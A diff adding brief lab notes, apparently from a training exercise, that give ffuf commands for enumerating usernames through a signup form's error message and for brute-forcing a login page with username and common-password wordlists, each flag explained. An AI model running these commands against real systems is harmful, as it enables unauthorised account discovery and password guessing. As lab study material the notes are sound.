@@ -1,0 +1,14 @@
+*** USERNAME ENUMERATION
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u [url signup] -mr "username already exists"
+-X = specifies the request method
+-d = specifies the data we are going to send
+-H = adding additional headers to the request
+-u = argument specifies the url we are going to request
+-mr = argument is the text on the page we are looking for to validate we've found a valid username.
+
+
+*** BRUTE FORCE
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
+W1 = list of valid Usernames
+W2 = list of passwords to try in wordlists
+-fc = filter to use to check for HTTPS STATUS CODE
